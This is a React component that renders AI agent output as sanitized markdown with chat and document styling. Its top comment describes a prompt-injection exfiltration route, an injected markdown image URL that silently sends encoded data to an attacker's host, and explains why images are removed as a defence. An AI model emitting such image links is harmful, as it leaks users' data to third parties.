import React from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkBreaks from 'remark-breaks';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import remend from 'remend';

import { cn } from '@repo/ui/lib/utils';

/**
 * Everything this component renders is model output, and model output is
 * downstream of documents we did not write. An `<img>` is the one markdown
 * element the browser fetches on its own, without a click, so an injected
 * `![](https://elsewhere/?data=...)` in an agent reply is a silent GET to a
 * host of the attacker's choosing, from an authenticated session, carrying
 * whatever it encoded in the URL. No surface needs agent-authored images, so
 * `img` leaves the schema entirely. Dropping the tag takes its alt text with
 * it, which is the accepted cost: a component override could render the alt
 * instead, but then the guarantee lives in a prop a later caller can replace
 * rather than in the schema.
 *
 * Raw HTML never becomes live nodes here regardless: `rehype-raw` is not in
 * the plugin list, so tags are dropped rather than parsed.
 */
const schema = {
  ...defaultSchema,
  tagNames: defaultSchema.tagNames?.filter((tag) => tag !== 'img'),
};

/**
 * `document` is the standalone-prose scale: headings step down from 2xl and
 * blocks are separated by a full line. `chat` inherits the surrounding chat
 * type scale instead, because inside a bubble a 2xl heading reads as a layout
 * bug, so headings only shift weight and blocks sit tighter together.
 */
type MarkdownVariant = 'document' | 'chat';

interface MarkdownContentProps {
  content: string;
  /** Typography scale. Defaults to the standalone-prose scale. */
  variant?: MarkdownVariant;
  /**
   * Set while the text is still arriving. Unterminated markdown (a `**` with
   * no closing pair, a half-typed `[link](`) is completed before parsing, so a
   * partial message renders as formatted text rather than showing raw syntax
   * and reflowing once the closer lands.
   */
  streaming?: boolean;
  className?: string;
}

// `pre` carries the code block's frame; the `code` inside it drops the inline
// chip styling so a fenced block is not a chip inside a box. `text-inherit`
// only resets colour, so the chip's font size needs its own reset or fenced
// code renders at 0.9 times the surrounding `pre`.
const CODE_BLOCK_RESET =
  '[&>code]:bg-transparent [&>code]:p-0 [&>code]:text-inherit [&>code]:text-[length:inherit]';

const styles = {
  document: {
    h1: 'mb-4 text-2xl font-bold',
    h2: 'mb-3 text-xl font-semibold',
    h3: 'mb-2 text-lg font-semibold',
    p: 'mb-4 last:mb-0',
    ul: 'mb-4 list-inside list-disc space-y-1',
    ol: 'mb-4 list-inside list-decimal space-y-1',
    pre: `bg-muted mb-4 overflow-x-auto rounded-md p-4 font-mono text-sm ${CODE_BLOCK_RESET}`,
    blockquote: 'border-muted-foreground/20 mb-4 border-l-4 pl-4 italic',
    table: 'mb-4 text-sm',
    hr: 'border-border my-4',
  },
  chat: {
    h1: 'mb-2 mt-3 font-semibold first:mt-0',
    h2: 'mb-2 mt-3 font-semibold first:mt-0',
    h3: 'mb-1 mt-2 font-semibold first:mt-0',
    p: 'mb-2 last:mb-0',
    ul: 'mb-2 ml-4 list-outside list-disc space-y-1 last:mb-0',
    ol: 'mb-2 ml-4 list-outside list-decimal space-y-1 last:mb-0',
    pre: `bg-muted mb-2 overflow-x-auto rounded-md p-2 font-mono text-xs last:mb-0 ${CODE_BLOCK_RESET}`,
    blockquote:
      'border-muted-foreground/20 mb-2 border-l-2 pl-3 italic last:mb-0',
    table: 'mb-2 last:mb-0',
    hr: 'border-border my-3',
  },
} satisfies Record<MarkdownVariant, Record<string, string>>;

// Memoized on purpose: a streaming transcript re-renders its whole list on
// every event, and react-markdown reparses on each render. Every prop here is
// a primitive, so settled entries stop reparsing once their text is final.
export const MarkdownContent = React.memo(function MarkdownContent({
  content,
  variant = 'document',
  streaming = false,
  className,
}: MarkdownContentProps) {
  const s = styles[variant];
  // Chat replaces a `whitespace-pre-wrap` bubble, where every newline the
  // agent wrote was a visible break. Plain markdown folds single newlines into
  // the paragraph, which silently reflows line-oriented replies, so chat keeps
  // them as breaks. Document prose is hard-wrapped on purpose and does not.
  const remarkPlugins =
    variant === 'chat' ? [remarkGfm, remarkBreaks] : [remarkGfm];
  // `text-only` over the default placeholder URL: a half-typed link should
  // degrade to its own text, not to an href on an invented protocol.
  const source = streaming
    ? remend(content, { linkMode: 'text-only' })
    : content;

  return (
    <div className={cn('min-w-0 break-words', className)}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={[[rehypeSanitize, schema]]}
        components={{
          // Custom component overrides for shadcn/ui styling
          h1: ({ children }) => <h1 className={s.h1}>{children}</h1>,
          h2: ({ children }) => <h2 className={s.h2}>{children}</h2>,
          // Tailwind preflight strips h4-h6 back to body text, and `####` is
          // common in model output, so they reuse the h3 step rather than
          // rendering as an unmarked paragraph.
          h3: ({ children }) => <h3 className={s.h3}>{children}</h3>,
          h4: ({ children }) => <h4 className={s.h3}>{children}</h4>,
          h5: ({ children }) => <h5 className={s.h3}>{children}</h5>,
          h6: ({ children }) => <h6 className={s.h3}>{children}</h6>,
          p: ({ children }) => <p className={s.p}>{children}</p>,
          ul: ({ children }) => <ul className={s.ul}>{children}</ul>,
          ol: ({ children }) => <ol className={s.ol}>{children}</ol>,
          li: ({ children }) => <li className="min-w-0">{children}</li>,
          pre: ({ children }) => <pre className={s.pre}>{children}</pre>,
          code: ({ children }) => (
            <code className="bg-muted rounded px-1 py-0.5 font-mono text-[0.9em]">
              {children}
            </code>
          ),
          blockquote: ({ children }) => (
            <blockquote className={s.blockquote}>{children}</blockquote>
          ),
          hr: () => <hr className={s.hr} />,
          // The scroll container carries the block spacing; a margin on both
          // it and the table would stack into a double gap.
          table: ({ children }) => (
            <div className={cn('overflow-x-auto', s.table)}>
              <table className="w-full text-left">{children}</table>
            </div>
          ),
          th: ({ children }) => (
            <th className="border-border border-b px-2 py-1 font-semibold">
              {children}
            </th>
          ),
          td: ({ children }) => (
            <td className="border-border/50 border-b px-2 py-1 align-top">
              {children}
            </td>
          ),
          a: ({ href, children }) => (
            <a
              href={href}
              className="text-primary hover:text-primary/80 underline"
              target="_blank"
              rel="noopener noreferrer"
            >
              {children}
            </a>
          ),
        }}
      >
        {source}
      </ReactMarkdown>
    </div>
  );
});
